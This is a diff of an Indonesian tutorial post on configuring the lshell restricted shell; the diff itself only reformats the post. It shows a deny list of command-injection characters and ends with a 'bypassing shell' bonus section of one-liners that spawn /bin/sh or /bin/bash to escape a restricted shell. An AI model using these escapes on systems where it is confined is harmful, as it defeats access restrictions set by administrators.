@@ -155,7 +155,9 @@ strict          : 0
 
 
 Basic Configuration:
+
 pada bagian *[default]* Settingan untuk menetapkan nilai default yang diterapkan pada semua pengguna dan grup. Pengaturan bagian ini dapat diganti dengan pengaturan khusus pengguna dan kelompok.
+
 
 {% highlight bash %}
 [default]
@@ -168,7 +170,9 @@ forbidden       : [';', '&', '|','`','>','<', '$(', '${']
 {% endhighlight %}
 
 
+
 > dibagian allowed kita bisa menambahkan command yang (bisa) digunakan. jadi hanya perintah yang didaftarkan saja yang bisa digunakan, yang tidak ditambahkan tidak dapat digunakan.
+
 
 
 ![alt text](https://image.prntscr.com/image/pswPHDzkR-GkIUtZQT2Bcw.png)
@@ -180,10 +184,10 @@ yarp sebenarnya masih banyak fungsi lshell yang lain, silahkan di explore lebih 
 btw kita bisa memanfaatkan lshell untuk default login shell di ssh pada beberapa kondisi seperti untuk soal-soal remote easy CTF dan untuk nge-troll user-user nakal.. asal jangan di troll balik saja... tinggal pakai perintah chsh saja untuk user yang di inginkan...
 
 
-BONUS :
+**BONUS :**
+{% highlight bash %}
 Bypassing Shell :
 
-{% highlight bash %}
 python -c 'import pty; pty.spawn("/bin/sh")'
 
 echo os.system('/bin/bash')
@@ -221,4 +225,5 @@ exec "/bin/sh"
 semoga aja settingan lshell atau other shell bisa di spawn.. :p
 
 
-Original Thread : http://forum.codernate.org/showthread.php?tid=64
+Original Thread : http://forum.codernate.org/showthread.php?tid=64/
+
